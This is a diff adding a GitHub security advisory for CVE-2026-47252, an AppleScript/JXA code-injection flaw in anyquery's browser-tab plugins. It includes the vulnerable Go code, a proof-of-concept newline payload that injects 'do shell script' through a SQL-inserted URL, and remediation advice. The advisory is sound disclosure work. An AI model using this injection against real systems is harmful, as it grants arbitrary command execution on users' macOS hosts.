@@ -1,0 +1,114 @@
+{
+  "id": "GHSA-hrj8-hjv8-mgwc",
+  "modified": "2026-06-08T23:15:19.278519307Z",
+  "published": "2026-06-08T23:04:00Z",
+  "aliases": [
+    "CVE-2026-47252"
+  ],
+  "summary": "Anyquery: AppleScript/JXA Code Injection via Unescaped URL in macOS Chrome Plugin",
+  "details": "# AppleScript/JXA Code Injection via Unescaped URL in macOS Chrome Plugin\n\n| Field            | Value |\n| ---------------- | ----- |\n| Repository       | julien040/anyquery |\n| Affected version | 0.4.4 (commit 0abd460) |\n| Vulnerability    | CWE-94 — Improper Control of Generation of Code |\n| Severity         | High |\n\n## Summary\n\nThe `chrome_tabs` plugin (and equivalent Brave/Edge/Safari variants) interpolates a SQL-controlled `url` value directly into an AppleScript template via `fmt.Sprintf(newTabScript, url)` at `plugins/chrome/tabs.go:141` without any escaping, then passes the result to `exec.Command(\"osascript\", \"-e\", ...)`. An authenticated anyquery user who can issue SQL `INSERT INTO chrome_tabs` statements — which requires local CLI access — can break out of the `{URL:\"...\"}` property record with a newline-containing payload and inject arbitrary AppleScript statements, including `do shell script`, achieving OS-level command execution on the macOS host. The same pattern applies to the `Update` path at `tabs.go:169` via the JXA `setURL.js` script.\n\n## Affected Code\n\n`plugins/chrome/tabs.go:141` — SQL-supplied `url` interpolated unescaped into AppleScript template, then executed via `osascript -e`\n\n```go\nfunc (t *tabsTable) Insert(rows [][]interface{}) error {\n\tfor _, row := range rows {\n\t\turl := \"chrome://newtab/\"\n\t\tif rawURL, ok := row[2].(string); ok {\n\t\t\turl = rawURL\n\t\t}\n\n\t\tcmd := exec.Command(\"osascript\", \"-e\", fmt.Sprintf(newTabScript, url))\n\t\toutput, err := cmd.CombinedOutput()\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"can't run osascript: %W (message: %s)\\n Script: %s\", err, output, fmt.Sprintf(newTabScript, url))\n\t\t}\n\n\t}\n\n\treturn nil\n}\n```\n\n`plugins/chrome/tabs.go:169` — `Update` path interpolates `url` into JXA `setURL.js` template with identical lack of escaping\n\n```go\n\t\tif url != \"\" {\n\t\t\tcmd := exec.Command(\"osascript\", \"-l\", \"JavaScript\", \"-e\", fmt.Sprintf(setURLScript, pk, url))\n\t\t\toutput, err := cmd.CombinedOutput()\n\t\t\tif err != nil {\n\t\t\t\treturn fmt.Errorf(\"can't run osascript: %W (message: %s)\\n Script: %s\", err, output, fmt.Sprintf(setURLScript, pk, url))\n\t\t\t}\n\t\t}\n```\n\nSQL INSERT `url` column (row[2]) flows through `tabsTable.Insert` → `fmt.Sprintf(newTabScript, url)` → `exec.Command(\"osascript\", \"-e\", \u003cinjected script\u003e)` at `tabs.go:141`.\n\n## Proof of Concept\n\nStep 1 — Insert a newline-bearing URL via SQL: the generated AppleScript closes the `{URL:\"...\"}` property record and appends an injected `do shell script \"id\"` block, which is passed verbatim to `osascript -e`.\n\n```bash\ndocker build -f Dockerfile -t anyquery-vuln001 .\ndocker run --rm anyquery-vuln001 'x\"}\nend tell\ndo shell script \"id\"\ntell application \"Google Chrome\"\n        make new tab with properties {URL:\"done'\n```\n\n```text\nSQL equivalent: INSERT INTO chrome_tabs (url) VALUES ('\u003cINJECT_URL\u003e')\nwhere INJECT_URL =\nx\"}\nend tell\ndo shell script \"id\"\ntell application \"Google Chrome\"\n\tmake new tab with properties {URL:\"done\n```\n\n```text\n[sink:tabs.go:141] Script passed to osascript -e:\ntell application \"Google Chrome\"\n        make new tab with properties {URL:\"x\"}\nend tell\ndo shell script \"id\"\ntell application \"Google Chrome\"\n        make new tab with properties {URL:\"done\"} at end of tabs of first window\nend tell\n[mock-osascript] Received script:\ntell application \"Google Chrome\"\n        make new tab with properties {URL:\"x\"}\nend tell\ndo shell script \"id\"\ntell application \"Google Chrome\"\n        make new tab with properties {URL:\"done\"} at end of tabs of first window\nend tell\n\nRESULT: PASS — injection payload reached osascript -e verbatim; \"do shell script \\\"id\\\"\" present in generated script (tabs.go:141)\n```\n\nSee attached files: Dockerfile, poc/inject_demo.go, poc/go.mod\n[vuln-001.zip](https://github.com/user-attachments/files/27945214/vuln-001.zip)\n\n## Impact\n\nAny local user authenticated to the anyquery CLI who can run SQL against the `chrome_tabs` virtual table can achieve arbitrary OS command execution on the macOS host with the privileges of the anyquery process. Because anyquery exposes its SQL interface over an HTTP server (accessible to any user who can reach the endpoint), this can be exploited by any client with INSERT or UPDATE access to the browser-tab plugins, without requiring Chrome credentials or macOS admin rights. The injected AppleScript runs under the user's macOS session, giving access to the file system, keychain prompts, and any application scriptable via Apple Events.\n\n## Remediation\n\nEscape double-quote and newline characters in the `url` value before interpolation, or avoid string templating entirely. Specifically in `plugins/chrome/tabs.go`:\n\n```go\n// Replace fmt.Sprintf(newTabScript, url) with:\nsafeURL := strings.ReplaceAll(url, `\"`, `\\\"`)\nsafeURL = strings.ReplaceAll(safeURL, \"\\n\", \"\")\nsafeURL = strings.ReplaceAll(safeURL, \"\\r\", \"\")\ncmd := exec.Command(\"osascript\", \"-e\", fmt.Sprintf(newTabScript, safeURL))\n```\n\nA more robust fix is to pass the URL as an AppleScript variable declared via a `-e` prefix argument rather than string-interpolating it into the script body, or to use the `osascript` `argv` mechanism so the URL never appears inside the script source. Apply the same fix to `fmt.Sprintf(setURLScript, pk, url)` at `tabs.go:169` for the `Update` path. Validate that the URL conforms to an allowed scheme (`https://`, `http://`, `chrome://`) before passing it to either handler.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/julien040/anyquery/plugins/chrome",
+        "purl": "pkg:golang/github.com/julien040/anyquery/plugins/chrome"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20240826075852-c651df0b8767"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-hrj8-hjv8-mgwc/GHSA-hrj8-hjv8-mgwc.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/julien040/anyquery/plugins/brave",
+        "purl": "pkg:golang/github.com/julien040/anyquery/plugins/brave"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20240826075852-c651df0b8767"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-hrj8-hjv8-mgwc/GHSA-hrj8-hjv8-mgwc.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/julien040/anyquery/plugins/edge",
+        "purl": "pkg:golang/github.com/julien040/anyquery/plugins/edge"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20240826075852-c651df0b8767"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-hrj8-hjv8-mgwc/GHSA-hrj8-hjv8-mgwc.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/julien040/anyquery/plugins/safari",
+        "purl": "pkg:golang/github.com/julien040/anyquery/plugins/safari"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20240826075852-c651df0b8767"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-hrj8-hjv8-mgwc/GHSA-hrj8-hjv8-mgwc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/julien040/anyquery/security/advisories/GHSA-hrj8-hjv8-mgwc"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/julien040/anyquery"
+    }
+  ]
+}
